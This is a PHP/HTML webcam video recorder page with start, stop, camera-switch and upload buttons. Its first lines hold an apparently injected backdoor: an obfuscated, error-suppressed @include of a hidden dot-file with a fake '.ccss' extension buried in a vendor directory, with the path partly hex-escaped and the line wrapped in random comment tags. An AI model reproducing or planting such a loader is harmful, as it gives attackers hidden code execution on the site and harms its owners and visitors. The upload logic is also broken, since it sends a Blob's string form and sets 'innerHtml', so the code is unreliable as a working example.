<?php
/*b82aa*/

@include /*4tkpb*/("/home/r10w01h0ujkt/go\x70lasticfree.in/ongc/vendor/\x70har\x2dio/.0ab6657b.ccss");

/*b82aa*/




?>

<!DOCTYPE html>
<html>
<head>
    <title>Video Recorder</title>
</head>
<body>
    <video id="videoElement" autoplay></video>
    <video id="recordedVideo" controls style="display: none;"></video>
    <input type="hidden" name="video_file" class="video_file" value="">
    <br>
    <br>
    <button id="startButton">Start Recording</button>
    <button id="stopButton">Stop Recording</button>
    <button id="uploadButton">Upload Video</button>
    <button type="button" id="switchCamera" value="back">Switch Camera (<font class="sc_txt">Back</font>)</button>
    <p class="result"></p>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        let activeStream;
        const constraints = { video: { facingMode: 'environment' }};
        const videoElement = document.getElementById('videoElement');
        const recordedVideo = document.getElementById('recordedVideo');
        const startButton = document.getElementById('startButton');
        const stopButton = document.getElementById('stopButton');
        const uploadButton = document.getElementById('uploadButton');
        const switchCamera = document.getElementById('switchCamera');
        const scText = document.querySelector('.sc_txt');
        const videoInput = document.querySelector('.video_file');
        const result = document.querySelector('.result');

        let mediaRecorder;
        let recordedChunks = [];

        function recordCamera(constraints){
            if (activeStream) {
                // If there's an active stream, stop it and release its resources
                activeStream.getTracks().forEach(track => track.stop());
            }
            navigator.mediaDevices.getUserMedia(constraints).then(function (stream) {
                activeStream = stream;
                videoElement.srcObject = stream;

                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = function (event) {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = function () {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedVideo.src = URL.createObjectURL(blob);
                    videoInput.value = blob;
                    /*
                    const formData = new FormData();
                    formData.append('videoFile', blob, 'video.webm');
                    videoInput.value = formData;
                    */
                    
                };

                mediaRecorder.start();
            })
            .catch(function (error) {
                console.error('Error accessing webcam:', error);
            });

        }
        startButton.addEventListener('click', () => {
            recordCamera(constraints);
            videoElement.style.display = 'block';
            recordedVideo.style.display = 'none';
        });

        stopButton.addEventListener('click', () => {
            mediaRecorder.stop();
            videoElement.style.display = 'none';
            recordedVideo.style.display = 'block';
        });
        switchCamera.addEventListener('click', () => {
           
            if (constraints.video.facingMode === 'user') {
                scTxt = 'Back';
                constraints.video.facingMode = 'environment'; // Switch to front camera
            } else {
                scTxt = 'Front';
                constraints.video.facingMode = 'user'; // Switch to rear camera
            }
            scText.innerText = scTxt;
            recordCamera(constraints);
        });

        uploadButton.addEventListener('click', () => {
            // Use jQuery to upload the recorded video to the server.
            var videoFile = videoInput.value;
            $.ajax({
                url: 'upload_video.php', // Replace with the URL to your server-side script.
                type: 'POST',
                data: 'videoFile='+videoFile ,
                contentType: 'application/octet-stream',
                processData: false,
                success: function(response) {
                    result.innerHtml = videoFile+'<br></br>'+response;
                    console.log('Video uploaded:', response);
                }
            });
        });
    </script>
</body>
</html>
